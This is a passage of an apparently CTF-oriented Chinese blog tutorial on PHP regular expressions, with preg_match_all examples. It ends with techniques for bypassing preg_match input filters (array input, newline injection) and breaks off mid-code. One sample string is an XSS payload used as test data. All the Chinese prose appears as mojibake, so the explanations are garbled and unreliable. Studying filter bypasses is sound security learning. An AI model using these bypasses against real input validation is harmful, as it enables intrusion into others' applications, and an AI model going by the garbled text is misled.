/></p>\n</li>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>è¿˜æ˜¯ ph*p è¿™é‡Œæ˜¯æŒ‡å‰é¢çš„å­—ç¬¦å‡ºç°ä»»æ„æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä¸ºç©ºï¼Œppã€phpã€phhpd ç­‰ç­‰</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph*p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200633268.png\" alt=\"image-20221108200633268\" /></p>\n</li>\n<li>\n<p>ï¼Ÿ</p>\n<p>å¯ä»¥è¿™é‡Œè¿˜æ˜¯ ph?pï¼Œè¿™é‡ŒæŒ‡å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–è€…é›¶æ¬¡</p>\n<p>ï¼Œppã€php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph?p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200704240.png\" alt=\"image-20221108200704240\" /></p>\n</li>\n<li>\n<p>[] ç”¨æ¥é™åˆ¶è§„åˆ™ï¼Œæ¯”å¦‚è¯´ [a-z] å°±æ˜¯åŒ¹é…æ‰€æœ‰çš„å°å†™å­—æ¯</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test 129\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z0-3]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200823705.png\" alt=\"image-20221108200823705\" /></p>\n</li>\n<li>\n<p>{} ç”¨æ¥é™åˆ¶æœŸæœ›å­—ç¬¦æ•°ï¼Œ{2-5} å°±æ˜¯æŒ‡å¯ä»¥æœ‰ 2-5 ä¸ªå­—ç¬¦é•¿åº¦ï¼ˆè¿™é‡Œç‚¹ä¸ç®—æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼‰</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abaaab\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/a&#123;2&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200925429.png\" alt=\"image-20221108200925429\" /></p>\n</li>\n<li>\n<p>(.) ç”¨æ¥åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼Œå¦‚æœé¡¹åŒ¹é…ã€‚å¯ä»¥ç”¨ []</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1a\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(.)/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108201351042.png\" alt=\"image-20221108201351042\" /></p>\n</li>\n</ul>\n<h3 id=\"æ™®é€šå­—ç¬¦\"><a class=\"anchor\" href=\"#æ™®é€šå­—ç¬¦\">#</a> æ™®é€šå­—ç¬¦</h3>\n<p>è¿™é‡Œçš„æ™®é€šå­—ç¬¦å°±æ˜¯æŒ‡å¸¸è§çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ‰€æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—ä»¥åŠä¸€äº›ç¬¦å·</p>\n<ol>\n<li>\n<p>ä¸Šé¢å·²ç»æåˆ° [] çš„ä½¿ç”¨ï¼Œä¸€èˆ¬å½¢å¼åŒ¹é… [flag]</p>\n</li>\n<li>\n<p>[^flag] æ˜¯æŒ‡åŒ¹é…é™¤äº† flag ä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1f2lxz\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^flag]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108203623635.png\" alt=\"image-20221108203623635\" /></p>\n</li>\n<li>\n<p>å•ç‹¬ä¸€ä¸ªç‚¹ä¼šåŒ¹é…å‡ºæ¥æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦</p>\n</li>\n<li>\n<p>[\\s\\S] è¿™é‡Œ \\s æ˜¯åŒ¹é…æ‰€æœ‰ç©ºç™½å­—ç¬¦ \\S æ˜¯åŒ¹é…æ‰€æœ‰çš„éç©ºç™½ç¬¦ï¼Œä¸åŒ…æ‹¬æ¢è¡Œ</p>\n</li>\n<li>\n<p>\\w è¿™ä¸ªç­‰ä»·äº [a-zA-Z0-9_]</p>\n</li>\n<li>\n<p>åœ¨æ­£åˆ™ä¸­æœ‰ä¸€ä¸ªï¼Ÿä½¿ç”¨çš„å¾ˆå¤šï¼Œè¿™é‡Œå•ç‹¬å†è®°å½•ä¸€ä¸‹</p>\n<p>å¦‚æœæƒ³åŒ¹é…è¡¨å•ä¸­çš„å†…å®¹æˆ‘ä»¬ç›´æ¥å†™ /&lt;.*&gt;/ è¿™æ ·ä¼šåŒ¹é…å…¨éƒ¨å†…å®¹</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204454412.png\" alt=\"image-20221108204454412\" /></p>\n<p>ä½†æ˜¯æˆ‘ä»¬å¦‚æœåªæƒ³çŸ¥é“éƒ½ä½¿ç”¨äº†ä»€ä¹ˆæ ‡ç­¾æ”¹æ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œå°±å¯ä»¥åªç”¨ï¼Ÿ</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*?>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204606363.png\" alt=\"image-20221108204606363\" /></p>\n</li>\n</ol>\n<h3 id=\"å®šä½ç¬¦\"><a class=\"anchor\" href=\"#å®šä½ç¬¦\">#</a> å®šä½ç¬¦</h3>\n<ul>\n<li>\n<p>^</p>\n<p>ä»å¼€å¤´å¼€å§‹åŒ¹é…</p>\n</li>\n<li>\n<p>$</p>\n<p>åŒ¹é…åˆ°ç»“å°¾ä½ç½®ï¼Œå¸¸ä¸ ^ ä¸€èµ·ä½¿ç”¨åªåŒ¹é…ä¸€è¡Œ</p>\n</li>\n<li>\n<p>\\b</p>\n<p>åŒ¹é…ä¸€ä¸ªå•è¯çš„è¾¹ç•Œ</p>\n</li>\n<li>\n<p>\\B</p>\n<p>åŒ¹é…ä¸€ä¸ªéè¾¹ç•Œ</p>\n</li>\n</ul>\n<p>å¯èƒ½ä¸Šé¢ç®€çŸ­çš„å‡ å¥çœ‹èµ·æ¥ä¼šå¾ˆæ‡µï¼Œæˆ‘çŸ¥é“ä½ å¾ˆæ€¥ï¼Œä½†ä½ åˆ«æ€¥ï¼Œæ¥ä¸‹æ¥ç®€å•çš„åšä¸€äº›æµ‹è¯•</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test123/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213340067.png\" alt=\"image-20221108213340067\" /></p>\n<p>å¦‚æœå¾…åŒ¹é…å¼€å¤´æ²¡æœ‰åˆ™ä¸èƒ½æˆåŠŸåŒ¹é…</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213541566.png\" alt=\"image-20221108213541566\" /></p>\n<p>ç„¶åæ¥è¯•ä¸€ä¸‹ ^ çš„ä½œç”¨</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1ï¼Œ109&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212503702.png\" alt=\"image-20221108212503702\" /></p>\n<p>è¿™é‡Œ ^ ä»å¼€å§‹ä½ç½®åŒ¹é…ï¼Œä½†æ˜¯ä¸ä¼šåŒ¹é…åˆ° \\n ä»¥åçš„å†…å®¹</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212605604.png\" alt=\"image-20221108212605604\" /></p>\n<p>ä»æœ«å°¾åŒ¹é…ä½†æ˜¯ä¸ä¼šåŒ¹é… \\n ä¹‹å‰çš„å†…å®¹</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1\ntest2\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213846413.png\" alt=\"image-20221108213846413\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214404871.png\" alt=\"image-20221108214404871\" /></p>\n<p>å½“ä¸¤ä¸ªç¬¦å·ä¸€èµ·ä½¿ç”¨æ—¶åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œæœ‰ \\n ä¸ä¼šåŒ¹é…</p>\n<p>è¡¥å……ï¼šè¿™é‡Œè¿›è¡Œå¯¹ç…§æ’é™¤ \\w æ¨¡å¼çš„å½±å“</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214825884.png\" alt=\"image-20221108214825884\" /></p>\n<h3 id=\"ä¿®é¥°ç¬¦\"><a class=\"anchor\" href=\"#ä¿®é¥°ç¬¦\">#</a> ä¿®é¥°ç¬¦</h3>\n<p>å¯¹äº preg_mach æˆ‘è·Ÿå–œæ¬¢ç§°å…¶ä¸ºæ¨¡å¼</p>\n<ul>\n<li>\n<p>i ä¸åŒºåˆ†å¤§å°å†™</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abc ABC\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/abc/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215432175.png\" alt=\"image-20221108215432175\" /></p>\n</li>\n<li>\n<p>g æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹</p>\n<p>è¿™ä¸ªå°±ç›¸å½“äº preg_match_all () å‡½æ•°</p>\n</li>\n<li>\n<p>m å¤šè¡ŒåŒ¹é…æ¨¡å¼</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\na\na\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215756785.png\" alt=\"image-20221108215756785\" /></p>\n</li>\n<li>\n<p>s ä½¿ã€‚åŒ…å« \\n</p>\n</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\na\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215829517.png\" alt=\"image-20221108215829517\" /></p>\n<h3 id=\"è¿ç®—ç¬¦ä¼˜å…ˆçº§\"><a class=\"anchor\" href=\"#è¿ç®—ç¬¦ä¼˜å…ˆçº§\">#</a> è¿ç®—ç¬¦ä¼˜å…ˆçº§</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">è¿ç®—ç¬¦</th>\n<th style=\"text-align:left\">æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">\\</td>\n<td style=\"text-align:left\">è½¬ä¹‰ç¬¦</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(), (?ğŸ˜ƒ, (?=), []</td>\n<td style=\"text-align:left\">åœ†æ‹¬å·å’Œæ–¹æ‹¬å·</td>\n</tr>\n<tr>\n<td style=\"text-align:left\" n,m=\"\">*, +, ?, {n}, {n,},</td>\n<td style=\"text-align:left\">é™å®šç¬¦</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">^, $, \\ ä»»ä½•å…ƒå­—ç¬¦ã€ä»»ä½•å­—ç¬¦</td>\n<td style=\"text-align:left\">å®šä½ç‚¹å’Œåºåˆ—ï¼ˆå³ï¼šä½ç½®å’Œé¡ºåºï¼‰</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">|</td>\n<td style=\"text-align:left\">æ›¿æ¢ï¼Œ&quot;æˆ–&quot; æ“ä½œ å­—ç¬¦å…·æœ‰é«˜äºæ›¿æ¢è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œä½¿å¾— &quot;m|food&quot; åŒ¹é… &quot;m&quot; æˆ– &quot;food&quot;ã€‚è‹¥è¦åŒ¹é… &quot;mood&quot; æˆ– &quot;food&quot;ï¼Œè¯·ä½¿ç”¨æ‹¬å·åˆ›å»ºå­è¡¨è¾¾å¼ï¼Œä»è€Œäº§ç”Ÿ &quot;(m|f) ood&quot;ã€‚</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td style=\"text-align:left\">è¿™é‡Œåˆ†äº«ä¸€ä¸ªå°å·¥å…·ï¼Œå¥½è¯„ [æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯•</td>\n<td style=\"text-align:left\">èœé¸Ÿå·¥å…· (<span class=\"exturl\" data-url=\"aHR0cDovL3J1bm9vYi5jb20=\">runoob.com</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jLnJ1bm9vYi5jb20vZnJvbnQtZW5kLzg1NC8=\">https://c.runoob.com/front-end/854/</span>)</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"preg_matchç»•è¿‡\"><a class=\"anchor\" href=\"#preg_matchç»•è¿‡\">#</a> preg_match ç»•è¿‡</h3>\n<p>æ­£åˆ™æ‰¯äº†è¿™ä¹ˆä¹…ï¼Œç°åœ¨æ¥è¯´è¯´è¿™ä¸ªä¸‡æ¶çš„ preg_match æ€ä¹ˆç»•è¿‡</p>\n<h4 id=\"æ•°ç»„ç»•è¿‡\"><a class=\"anchor\" href=\"#æ•°ç»„ç»•è¿‡\">#</a> æ•°ç»„ç»•è¿‡</h4>\n<p>preg_match åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„ subject æ˜¯æ•°ç»„æ—¶ä¼šè¿”å› false</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Match found\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"æ¢è¡Œç»•è¿‡\"><a class=\"anchor\" href=\"#æ¢è¡Œç»•è¿‡\">#</a> æ¢è¡Œç»•è¿‡</h4>\n<p>ä¸Šé¢æµ‹è¯•ä¹Ÿæœ‰æåˆ°ï¼Œå½“ ^$ åŒæ—¶å­˜åœ¨ä¸”ä¸æ˜¯ m æ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œæœ‰æ¢è¡Œè¿”å›ç©ºï¼Œä¸”ç‚¹ä¸ä¼šåŒ¹é…æ¢è¡Œ</p>\n<p>å› æ­¤é¢å¯¹ä¸‹é¢çš„æƒ…å†µä¸­å°±èƒ½é€šè¿‡æ¢è¡Œæ¥ç»•è¿‡æ­£åˆ™</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token 